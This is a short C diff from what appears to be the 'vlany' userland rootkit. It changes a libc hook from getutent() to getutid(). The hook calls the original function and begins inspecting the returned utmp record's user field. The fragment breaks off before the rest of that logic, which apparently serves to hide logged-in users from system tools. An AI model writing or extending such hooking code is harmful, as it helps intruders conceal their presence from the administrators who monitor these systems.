@@ -1,13 +1,13 @@
-struct utmp *getutent(void)
+struct utmp *getutid(const struct utmp *ut)
 {
     #ifdef DEBUG
-        printf("[vlany] getutent() called\n");
+        printf("[vlany] getutid() called\n");
     #endif
 
-    HOOK(old_getutent, CGETUTENT);
+    HOOK(old_getutid, CGETUTID);
 
     struct utmp *tmp;
-    tmp = old_getutent();
+    tmp = old_getutid(ut);
 
     if(tmp && tmp->ut_user != NULL)
     {
